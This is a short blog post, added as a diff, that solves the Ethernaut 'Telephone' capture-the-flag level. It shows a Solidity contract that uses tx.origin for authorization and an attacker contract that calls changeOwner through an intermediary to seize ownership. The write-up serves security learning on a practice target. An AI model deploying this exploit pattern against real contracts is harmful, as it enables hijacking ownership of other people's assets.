@@ -1,0 +1,53 @@
+---
+title: Ethernaut - Telephone - Solution
+date: '2024-05-05'
+tags: ['security', 'solidity', 'ctfs']
+draft: false
+summary: Solution to the Ethernaut - Telephone CTF
+---
+
+# Ethernaut - Telephone - Solution
+
+## Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Telephone {
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function changeOwner(address _owner) public {
+        if (tx.origin != msg.sender) {
+            owner = _owner;
+        }
+    }
+}
+```
+
+## Exploit
+
+To claim ownership of the above contract, we need to call `changeOwner()` while ensuring that `tx.origin != msg.sender`.
+This is easily achieved by calling `changeOwner()` from the following attacker contract rather than our externally owned account:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract TelephoneAttacker {
+    address public immutable VICTIM;
+
+    constructor(address victim) {
+        VICTIM = victim;
+    }
+
+    function attack() external {
+        (bool success, ) = VICTIM.call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
+        require(success, "Attack failed");
+    }
+}
+```
